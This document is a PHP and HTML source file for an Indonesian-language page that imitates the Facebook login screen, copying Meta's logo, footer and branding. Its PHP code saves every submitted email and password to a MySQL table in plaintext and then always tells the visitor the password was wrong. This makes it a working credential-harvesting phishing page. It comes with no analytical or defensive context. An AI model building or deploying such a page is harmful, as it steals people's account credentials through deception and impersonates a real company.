<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Masuk Facebook</title>
  <link rel="shortcut icon" href="./public/favicon.ico">
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-neutral-100 flex flex-col min-h-screen">
  <?php
  $error_message = '';

  if (isset($_GET['success_message'])) {
    $success_message = $_GET['success_message'];
  }

  if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $servername = "localhost:3306";
    $username = "root";
    $password = "";
    $dbname = "clonefb"; // Ganti dengan nama database Anda

    // Membuat koneksi ke database
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Mengecek koneksi
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }

    // Mendapatkan data dari form
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Mengamankan data inputan user
    $email = $conn->real_escape_string($email);
    $password = $conn->real_escape_string($password);

    // Menyimpan data ke database
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";
    if ($conn->query($sql) === TRUE) {
      $error_message = "Password salah, silahkan coba kembali";
    } else {
      $error_message = "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
  }
  ?>
  <div class="flex flex-col flex-grow pt-10 justify-center items-center w-[90vw] mx-auto">
    <div class="mb-2">
      <img src="./public/facebook.svg" alt="Facebook Logo" class="w-64">
    </div>
    <!-- Login Container -->
    <div class="bg-white px-4 py-4 border-2 rounded-lg shadow-xl min-w-[26rem] max-w-md mb-8">
      <h1 class="text-xl text-center mb-5 text-neutral-700">Login ke Facebook</h1>
      <?php
      if (!empty($error_message)) {
        echo "<div class='bg-red-200 text-red-800 p-4 mb-4 rounded-md text-center'>$error_message</div>";
      } else if (isset($success_message)) {
        echo "<div class='bg-green-200 text-green-800 p-4 mb-4 rounded-md text-center'>$success_message</div>";
      }
      ?>
      <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
        <div class="mb-4">
          <input type="text" name="email" id="email" placeholder="Email atau Nomor Telepon" required class="mt-1 block w-full px-3 py-3 border border-neutral-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500">
        </div>
        <div class="mb-4">
          <input type="password" name="password" id="password" placeholder="Kata Sandi" required class="mt-1 block w-full px-3 py-3 border border-neutral-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500 focus:border-indigo-500">
        </div>
        <div class="flex items-center justify-between">
          <button type="submit" class="w-full px-4 py-2 bg-blue-500 text-white text-xl font-bold rounded-md hover:bg-blue-600 focus:outline-none focus:bg-blue-600">Masuk</button>
        </div>
        <div class="flex items-center mt-3 items-center">
          <a href="#" class="w-full text-blue-500 hover:underline text-center text-sm">Lupa akun?</a>
        </div>
        <div class="flex items-center justify-center my-2">
          <hr class="flex-grow border-neutral-300">
          <span class="px-2 text-neutral-500 text-sm">atau</span>
          <hr class="flex-grow border-neutral-300">
        </div>
        <div class="flex items-center justify-center">
          <a href="/register.php"><button type="button" class="w-auto py-2 px-4 mb-2 bg-green-500 text-white font-bold rounded-md hover:bg-green-600 focus:outline-none focus:bg-green-600">Buat akun baru</button></a>
        </div>
      </form>
    </div>
  </div>

  <!-- footer -->
  <footer class="bg-white w-full mt-4">
    <div class="container mx-auto text-left p-4">
      <div class="flex flex-wrap gap-x-2 gap-y-1.5">
        <a class="text-gray-600 text-xs hover:underline">Bahasa Indonesia</a><a class="text-gray-600 text-xs hover:underline">English (UK)</a><a class="text-gray-600 text-xs hover:underline">Basa Jawa</a>
        <a class="text-gray-600 text-xs hover:underline">Bahasa Melayu</a><a class="text-gray-600 text-xs hover:underline">日本語</a><a class="text-gray-600 text-xs hover:underline">العربية</a>
        <a class="text-gray-600 text-xs hover:underline">Français (France)</a><a class="text-gray-600 text-xs hover:underline">Español</a><a class="text-gray-600 text-xs hover:underline">한국어</a>
        <a class="text-gray-600 text-xs hover:underline">Português (Brasil)</a><a class="text-gray-600 text-xs hover:underline">Deutsch</a>
        <a class="text-gray-600 text-sm hover:underline border px-2 bg-neutral-100 hover:bg-neutral-200">+</a>
      </div>
      <hr class="border-neutral-300 my-2">
      <div class="flex flex-wrap gap-x-5 gap-y-1.5 my-2">
        <a class="text-gray-600 text-xs hover:underline">Daftar</a><a class="text-gray-600 text-xs hover:underline">Masuk</a><a class="text-gray-600 text-xs hover:underline">Messenger</a>
        <a class="text-gray-600 text-xs hover:underline">Facebook Lite</a><a class="text-gray-600 text-xs hover:underline">Video</a><a class="text-gray-600 text-xs hover:underline">Tempat</a>
        <a class="text-gray-600 text-xs hover:underline">Game</a><a class="text-gray-600 text-xs hover:underline">Marketplace</a><a class="text-gray-600 text-xs hover:underline">Meta Pay</a>
        <a class="text-gray-600 text-xs hover:underline">Meta Store</a><a class="text-gray-600 text-xs hover:underline">Meta Quest</a><a class="text-gray-600 text-xs hover:underline">Meta AI</a>
        <a class="text-gray-600 text-xs hover:underline">Instagram</a><a class="text-gray-600 text-xs hover:underline">Threads</a><a class="text-gray-600 text-xs hover:underline">Penggalangan Dana</a>
        <a class="text-gray-600 text-xs hover:underline">Layanan</a><a class="text-gray-600 text-xs hover:underline">Pusat Informasi Pemilu</a> <a class="text-gray-600 text-xs hover:underline">Kebijakan Privasi</a>
        <a class="text-gray-600 text-xs hover:underline">Pusat Privasi</a><a class="text-gray-600 text-xs hover:underline">Grup</a> <a class="text-gray-600 text-xs hover:underline">Meta di Indonesia</a>
        <a class="text-gray-600 text-xs hover:underline">Tentang</a><a class="text-gray-600 text-xs hover:underline">Buat Iklan</a> <a class="text-gray-600 text-xs hover:underline">Buat Halaman</a>
        <a class="text-gray-600 text-xs hover:underline">Developer</a><a class="text-gray-600 text-xs hover:underline">Karier</a> <a class="text-gray-600 text-xs hover:underline">Cookie</a>
        <a class="text-gray-600 text-xs hover:underline">Pilihan Iklan</a><a class="text-gray-600 text-xs hover:underline">Ketentuan</a>
        <a class="text-gray-600 text-xs hover:underline">Bantuan</a>
        <a class="text-gray-600 text-xs hover:underline">Pengunggahan Kontak & Non-Pengguna</a>
      </div>
      <div class="text-gray-600 text-xs mt-5">Meta © 2024</div>
    </div>
  </footer>
</body>

</html>